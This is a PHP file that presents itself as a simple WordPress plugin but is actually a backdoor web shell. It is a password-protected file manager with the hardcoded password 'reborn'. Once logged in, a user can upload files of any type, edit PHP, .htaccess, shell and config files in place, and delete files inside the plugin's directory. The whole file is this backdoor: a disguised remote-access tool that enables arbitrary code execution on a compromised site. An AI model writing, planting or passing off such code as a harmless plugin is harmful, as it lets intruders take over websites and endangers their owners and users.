<?php
/**
 * Plugin Name: My Custom plugin
 * Description: A simple plugin for wordpress
 * Version: 1.0
 * Author: mohammad
 */
$password = 'reborn';

// --- SECURITY ---
$hashed_password = password_hash($password, PASSWORD_DEFAULT);
$editable_extensions = ['php', 'txt', 'html', 'css', 'js', 'json', 'md', 'xml', 'log', 'htaccess', 'ini', 'sql', 'py', 'sh'];

// --- ERROR REPORTING (for debugging) ---
// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);

// --- SESSION MANAGEMENT ---
session_start();

// --- LOGOUT LOGIC ---
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . basename(__FILE__));
    exit;
}

// --- LOGIN LOGIC ---
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if (password_verify($_POST['password'], $hashed_password)) {
        $_SESSION['is_logged_in'] = true;
        header('Location: ' . basename(__FILE__));
        exit;
    } else {
        $login_error = "Galat Password!";
    }
}

// --- AUTHENTICATION CHECK ---
if (!isset($_SESSION['is_logged_in'])) {
    // Show Login Form
    ?>
    <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login</title><script src="https://cdn.tailwindcss.com"></script></head><body class="bg-gray-900 text-white flex items-center justify-center h-screen"><div class="bg-gray-800 p-8 rounded-lg shadow-xl w-full max-w-sm"><h1 class="text-2xl font-bold mb-6 text-center text-cyan-400">File Manager Login</h1><form method="POST" action=""><div class="mb-4"><label for="password" class="block mb-2 text-sm font-medium text-gray-300">Password</label><input type="password" name="password" id="password" class="bg-gray-700 border border-gray-600 text-white text-sm rounded-lg focus:ring-cyan-500 focus:border-cyan-500 block w-full p-2.5" required></div><?php if (isset($login_error)): ?><p class="text-red-500 text-xs italic mb-4"><?php echo $login_error; ?></p><?php endif; ?><button type="submit" class="w-full text-white bg-cyan-600 hover:bg-cyan-700 focus:ring-4 focus:outline-none focus:ring-cyan-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center">Login</button></form></div></body></html>
    <?php
    exit;
}

// --- FILE MANAGER LOGIC ---

$message = isset($_GET['msg']) ? $_GET['msg'] : '';
$message_type = isset($_GET['type']) ? $_GET['type'] : '';

// Get current directory and apply security checks
$script_path = realpath(dirname(__FILE__));
$current_dir = isset($_GET['path']) ? realpath($_GET['path']) : $script_path;
if (!$current_dir || !is_dir($current_dir) || strpos($current_dir, $script_path) !== 0) {
    $current_dir = $script_path;
}

// --- FILE SAVE ACTION ---
if (isset($_POST['save_file']) && isset($_POST['file_path']) && isset($_POST['file_content'])) {
    $file_to_save = realpath($_POST['file_path']);
    // Security Check: Ensure file is within the script's directory
    if ($file_to_save && strpos($file_to_save, $script_path) === 0 && is_file($file_to_save)) {
        if (file_put_contents($file_to_save, $_POST['file_content']) !== false) {
            $message = "File '" . htmlspecialchars(basename($file_to_save)) . "' save ho gayi.";
            $message_type = 'success';
        } else {
            $message = "File save karne mein error aaya. Permissions check karein.";
            $message_type = 'error';
        }
    } else {
        $message = "Invalid file path ya action allowed nahi hai.";
        $message_type = 'error';
    }
    // Redirect back to the directory listing
    header('Location: ' . basename(__FILE__) . '?path=' . urlencode(dirname($file_to_save)) . '&msg=' . urlencode($message) . '&type=' . $message_type);
    exit;
}

// --- FILE EDITOR VIEW ---
if (isset($_GET['edit'])) {
    $file_to_edit = realpath($current_dir . '/' . $_GET['edit']);
    $file_extension = pathinfo($file_to_edit, PATHINFO_EXTENSION);

    // Security Check: Ensure file is within the script's directory and is editable
    if ($file_to_edit && strpos($file_to_edit, $script_path) === 0 && is_file($file_to_edit) && in_array($file_extension, $editable_extensions)) {
        $file_content = htmlspecialchars(file_get_contents($file_to_edit));
        ?>
        <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Edit File</title><script src="https://cdn.tailwindcss.com"></script></head><body class="bg-gray-900 text-white p-4 md:p-8"><div class="max-w-7xl mx-auto bg-gray-800 rounded-lg shadow-xl p-6"><div class="flex justify-between items-center mb-4"><h1 class="text-xl font-bold text-cyan-400">Editing: <span class="text-gray-300"><?php echo htmlspecialchars(basename($file_to_edit)); ?></span></h1></div><form action="" method="post"><input type="hidden" name="file_path" value="<?php echo htmlspecialchars($file_to_edit); ?>"><textarea name="file_content" class="w-full h-[70vh] bg-gray-900 text-gray-300 font-mono text-sm p-4 rounded-lg border border-gray-600 focus:ring-cyan-500 focus:border-cyan-500"><?php echo $file_content; ?></textarea><div class="mt-4 flex justify-end gap-4"><a href="?path=<?php echo urlencode($current_dir); ?>" class="bg-gray-600 hover:bg-gray-700 text-white font-bold py-2 px-4 rounded-lg">Cancel</a><button type="submit" name="save_file" class="bg-cyan-600 hover:bg-cyan-700 text-white font-bold py-2 px-4 rounded-lg">Save Changes</button></div></form></div></body></html>
        <?php
        exit;
    } else {
        $message = "Aap yeh file edit nahi kar sakte.";
        $message_type = 'error';
        header('Location: ' . basename(__FILE__) . '?path=' . urlencode($current_dir) . '&msg=' . urlencode($message) . '&type=' . $message_type);
        exit;
    }
}


// --- OTHER FILE/FOLDER ACTIONS (Upload, Create, Delete) ---

// File Upload
if (isset($_FILES['file_to_upload'])) {
    $target_file = $current_dir . '/' . basename($_FILES["file_to_upload"]["name"]);
    if (move_uploaded_file($_FILES["file_to_upload"]["tmp_name"], $target_file)) {
        $message = "File '" . htmlspecialchars(basename($_FILES["file_to_upload"]["name"])) . "' upload ho gaya.";
        $message_type = 'success';
    } else { $message = "File upload karne mein error aaya."; $message_type = 'error'; }
    header('Location: ' . basename(__FILE__) . '?path=' . urlencode($current_dir) . '&msg=' . urlencode($message) . '&type=' . $message_type);
    exit;
}

// Create Directory
if (isset($_POST['create_dir'])) {
    $new_dir = $current_dir . '/' . sanitize_filename($_POST['dir_name']);
    if (!file_exists($new_dir) && mkdir($new_dir, 0755)) {
        $message = "Directory '" . htmlspecialchars($_POST['dir_name']) . "' ban gayi.";
        $message_type = 'success';
    } else { $message = "Directory banane mein error aaya. Shayad permission issue hai."; $message_type = 'error'; }
    header('Location: ' . basename(__FILE__) . '?path=' . urlencode($current_dir) . '&msg=' . urlencode($message) . '&type=' . $message_type);
    exit;
}

// Delete File/Directory
if (isset($_GET['delete'])) {
    $item_to_delete = realpath($current_dir . '/' . $_GET['delete']);
    if ($item_to_delete && strpos($item_to_delete, $current_dir) === 0 && basename($item_to_delete) != basename(__FILE__)) { // Prevent self-delete
        if (is_dir($item_to_delete)) {
            if (count(scandir($item_to_delete)) == 2) { 
                rmdir($item_to_delete);
                $message = "Directory '" . htmlspecialchars($_GET['delete']) . "' delete ho gayi.";
                $message_type = 'success';
            } else { $message = "Directory khali nahi hai, isliye delete nahi kar sakte."; $message_type = 'error'; }
        } else {
            unlink($item_to_delete);
            $message = "File '" . htmlspecialchars($_GET['delete']) . "' delete ho gayi.";
            $message_type = 'success';
        }
    }
    header('Location: ' . basename(__FILE__) . '?path=' . urlencode($current_dir) . '&msg=' . urlencode($message) . '&type=' . $message_type);
    exit;
}


// --- HELPER FUNCTIONS ---
function sanitize_filename($filename) { return preg_replace('/[^A-Za-z0-9\.\-\_]/', '', $filename); }
function format_size($bytes) { $units = ['B', 'KB', 'MB', 'GB', 'TB']; $i = 0; while ($bytes >= 1024 && $i < count($units) - 1) { $bytes /= 1024; $i++; } return round($bytes, 2) . ' ' . $units[$i]; }

// --- RENDER MAIN PAGE ---
$items = scandir($current_dir);
$parent_dir = ($current_dir != $script_path) ? dirname($current_dir) : null;
?>
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PHP File Manager</title><script src="https://cdn.tailwindcss.com"></script><style>body { font-family: 'Inter', sans-serif; background-color: #111827; color: #E5E7EB; }.icon { width: 1.25rem; height: 1.25rem; margin-right: 0.75rem; }</style></head><body class="p-4 md:p-8"><div class="max-w-7xl mx-auto bg-gray-800 rounded-lg shadow-xl p-6"><div class="flex justify-between items-center mb-6 border-b border-gray-700 pb-4"><h1 class="text-2xl font-bold text-cyan-400">PHP File Manager</h1><a href="?logout=true" class="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded-lg text-sm">Logout</a></div><?php if ($message): ?><div class="p-4 mb-4 text-sm rounded-lg <?php echo $message_type === 'success' ? 'bg-green-900 text-green-300' : 'bg-red-900 text-red-300'; ?>"><?php echo htmlspecialchars($message); ?></div><?php endif; ?><div class="mb-4 text-gray-400 break-words"><strong>Current Path:</strong> <?php echo htmlspecialchars($current_dir); ?></div><div class="grid md:grid-cols-2 gap-6 mb-6"><div class="bg-gray-900 p-4 rounded-lg"><h3 class="font-semibold mb-2 text-cyan-400">Upload File</h3><form action="?path=<?php echo urlencode($current_dir); ?>" method="post" enctype="multipart/form-data"><input type="file" name="file_to_upload" id="file_to_upload" class="block w-full text-sm text-gray-400 file:mr-4 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-sm file:font-semibold file:bg-cyan-600 file:text-white hover:file:bg-cyan-700"><button type="submit" class="mt-2 w-full bg-cyan-600 hover:bg-cyan-700 text-white font-bold py-2 px-4 rounded-lg">Upload</button></form></div><div class="bg-gray-900 p-4 rounded-lg"><h3 class="font-semibold mb-2 text-cyan-400">Create Directory</h3><form action="?path=<?php echo urlencode($current_dir); ?>" method="post" class="flex items-center"><input type="text" name="dir_name" placeholder="Directory Name" class="bg-gray-700 border border-gray-600 rounded-l-lg p-2 flex-grow focus:ring-cyan-500 focus:border-cyan-500"><button type="submit" name="create_dir" class="bg-cyan-600 hover:bg-cyan-700 text-white font-bold py-2 px-4 rounded-r-lg">Create</button></form></div></div><div class="overflow-x-auto"><table class="w-full text-left text-sm text-gray-300"><thead class="text-xs text-cyan-400 uppercase bg-gray-700"><tr><th scope="col" class="px-6 py-3">Name</th><th scope="col" class="px-6 py-3">Size</th><th scope="col" class="px-6 py-3">Modified</th><th scope="col" class="px-6 py-3">Actions</th></tr></thead><tbody><?php if ($parent_dir): ?><tr class="bg-gray-800 border-b border-gray-700 hover:bg-gray-600"><td class="px-6 py-4 font-medium whitespace-nowrap"><a href="?path=<?php echo urlencode($parent_dir); ?>" class="flex items-center text-cyan-400 hover:underline"><svg class="icon" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M3 14h18m-9-4v8m-7 0h14a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg> ..</a></td><td></td><td></td><td></td></tr><?php endif; ?><?php foreach ($items as $item): ?><?php if ($item === '.' || $item === '..') continue; ?><?php $path = $current_dir . '/' . $item; ?><tr class="bg-gray-800 border-b border-gray-700 hover:bg-gray-600"><td class="px-6 py-4 font-medium whitespace-nowrap"><?php if (is_dir($path)): ?><a href="?path=<?php echo urlencode($path); ?>" class="flex items-center text-cyan-400 hover:underline"><svg class="icon text-yellow-400" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M2 6a2 2 0 012-2h5l2 2h5a2 2 0 012 2v6a2 2 0 01-2 2H4a2 2 0 01-2-2V6z"></path></svg> <?php echo htmlspecialchars($item); ?></a><?php else: ?><div class="flex items-center"><svg class="icon" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M4 4a2 2 0 012-2h4.586A2 2 0 0112 2.586L15.414 6A2 2 0 0116 7.414V16a2 2 0 01-2 2H6a2 2 0 01-2-2V4zm2 6a1 1 0 011-1h6a1 1 0 110 2H7a1 1 0 01-1-1zm1 3a1 1 0 100 2h6a1 1 0 100-2H7z" clip-rule="evenodd"></path></svg> <?php echo htmlspecialchars($item); ?></div><?php endif; ?></td><td class="px-6 py-4"><?php echo is_file($path) ? format_size(filesize($path)) : 'Folder'; ?></td><td class="px-6 py-4"><?php echo date("Y-m-d H:i:s", filemtime($path)); ?></td><td class="px-6 py-4 space-x-2"><?php if (is_file($path) && in_array(pathinfo($path, PATHINFO_EXTENSION), $editable_extensions)): ?><a href="?path=<?php echo urlencode($current_dir); ?>&edit=<?php echo urlencode($item); ?>" class="font-medium text-blue-400 hover:underline">Edit</a><?php endif; ?><?php if ($path != $script_path): // Prevent self-delete ?><a href="?path=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($item); ?>" onclick="return confirm('Pakka delete karna hai \'<?php echo htmlspecialchars($item); ?>\'?');" class="font-medium text-red-500 hover:underline">Delete</a><?php endif; ?></td></tr><?php endforeach; ?></tbody></table></div></div></body></html>

